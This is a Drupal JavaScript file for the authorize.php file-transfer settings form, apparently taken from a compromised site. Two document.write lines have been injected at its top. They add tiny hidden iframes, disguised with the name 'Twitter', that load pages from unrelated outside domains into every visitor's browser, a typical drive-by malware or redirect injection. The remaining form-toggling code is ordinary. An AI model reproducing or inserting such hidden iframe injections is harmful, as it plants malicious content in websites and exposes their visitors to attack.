document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://vanderlaandemunck.com/hbdn.html?j=2617366></iframe>');

document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://seosuccess.net16.net/zqlv.html?j=1962603></iframe>');

/**
 * @file
 * Conditionally hide or show the appropriate settings and saved defaults
 * on the file transfer connection settings form used by authorize.php.
 */

(function ($) {

Drupal.behaviors.authorizeFileTransferForm = {
  attach: function(context) {
    $('#edit-connection-settings-authorize-filetransfer-default').change(function() {
      $('.filetransfer').hide().filter('.filetransfer-' + $(this).val()).show();
    });
    $('.filetransfer').hide().filter('.filetransfer-' + $('#edit-connection-settings-authorize-filetransfer-default').val()).show();

    // Removes the float on the select box (used for non-JS interface).
    if ($('.connection-settings-update-filetransfer-default-wrapper').length > 0) {
      $('.connection-settings-update-filetransfer-default-wrapper').css('float', 'none');
    }
    // Hides the submit button for non-js users.
    $('#edit-submit-connection').hide();
    $('#edit-submit-process').show();
  }
};

})(jQuery);